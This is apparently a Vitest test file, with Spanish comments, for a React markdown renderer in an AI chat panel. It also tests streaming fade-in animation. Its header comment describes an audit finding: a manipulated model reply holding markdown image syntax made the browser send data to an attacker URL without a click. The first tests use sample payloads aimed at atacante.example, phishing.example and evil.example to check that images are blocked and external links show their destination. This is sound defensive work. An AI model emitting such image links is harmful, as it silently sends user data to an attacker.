/**
 * @vitest-environment happy-dom
 */

/**
 * El chat pinta markdown escrito por un modelo (auditoría de seguridad 23-09).
 * Una respuesta manipulada con `![](https://atacante/x?d=<datos>)` hacía que el
 * navegador pidiera esa URL solo, sin clic, con los datos en la query. Estas
 * pruebas fijan que ninguna imagen se carga y que un enlace a otro sitio dice
 * adónde va.
 */

import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';
import { MarkdownRenderer, destinoExterno } from './MarkdownRenderer';

function render(elemento: React.ReactElement): { container: HTMLElement } {
  const container = document.createElement('div');
  container.innerHTML = renderToStaticMarkup(elemento);
  return { container };
}

describe('MarkdownRenderer — respuestas de IA', () => {
  it('una imagen NO se carga: queda como texto con su destino', () => {
    const { container } = render(
      <MarkdownRenderer content={'Mira: ![cartera](https://atacante.example/x.png?d=SALDO-123)'} />,
    );
    expect(container.querySelector('img')).toBeNull();
    expect(container.textContent).toContain('Imagen: cartera');
    expect(container.textContent).toContain('atacante.example');
  });

  it('un enlace a otro sitio muestra su dominio al lado del texto', () => {
    const { container } = render(
      <MarkdownRenderer content={'[Ver estado de cuenta](https://phishing.example/login)'} />,
    );
    const a = container.querySelector('a')!;
    expect(a.textContent).toContain('Ver estado de cuenta');
    expect(a.textContent).toContain('phishing.example/login');
    expect(a.getAttribute('rel')).toContain('noopener');
  });

  it('un enlace interno del panel no lleva destino al lado', () => {
    const { container } = render(<MarkdownRenderer content={'[Contratos](/panel/inmobiliaria/contratos)'} />);
    expect(container.querySelector('a')!.textContent).toBe('Contratos');
  });

  it('destinoExterno recorta rutas largas y deja fuera lo interno', () => {
    expect(destinoExterno('/panel/x')).toBeNull();
    expect(destinoExterno('#arriba')).toBeNull();
    expect(destinoExterno('//evil.example/a')).toBe('evil.example/a');
    expect(destinoExterno('https://a.example/' + 'b'.repeat(50))).toMatch(/^a\.example\/b{29}…$/);
  });
});

/**
 * El final del revelado (Nico, 23-09: «que se sienta pulido»). Pasados los
 * primeros ~250 caracteres el texto llega por palabras y luego por bloques
 * (`src/lib/chat/revelado.ts`); sin fundido eso parpadea. Lo nuevo se envuelve
 * en un elemento que se funde; el tecleo de una sola letra no.
 */
describe('MarkdownRenderer — el texto recién revelado se funde', () => {
  async function montar() {
    const { createRoot } = await import('react-dom/client');
    const { act } = await import('react');
    (globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true;
    const container = document.createElement('div');
    document.body.appendChild(container);
    const root = createRoot(container);
    return {
      container,
      pintar: (content: string, isStreaming = true) =>
        act(() => root.render(<MarkdownRenderer content={content} isStreaming={isStreaming} />)),
      soltar: () => {
        act(() => root.unmount());
        container.remove();
      },
    };
  }

  it('un bloque de varias palabras entra con fundido; lo ya visible no se vuelve a animar', async () => {
    const m = await montar();
    m.pintar('Tienes 29 contratos');
    m.pintar('Tienes 29 contratos que vencen en octubre.');
    const fundidos = [...m.container.querySelectorAll('span.animate-in')];
    expect(fundidos.map((s) => s.textContent).join('')).toBe(' que vencen en octubre.');
    m.soltar();
  });

  it('una letra más es el tecleo de siempre: sin fundido', async () => {
    const m = await montar();
    m.pintar('Tienes 2');
    m.pintar('Tienes 29');
    expect(m.container.querySelector('span.animate-in')).toBeNull();
    m.soltar();
  });

  it('terminada la respuesta no queda ningún envoltorio', async () => {
    const m = await montar();
    m.pintar('Tienes 29');
    m.pintar('Tienes 29 contratos que vencen en octubre.');
    m.pintar('Tienes 29 contratos que vencen en octubre.', false);
    expect(m.container.querySelector('span.animate-in')).toBeNull();
    expect(m.container.textContent).toBe('Tienes 29 contratos que vencen en octubre.');
    m.soltar();
  });
});
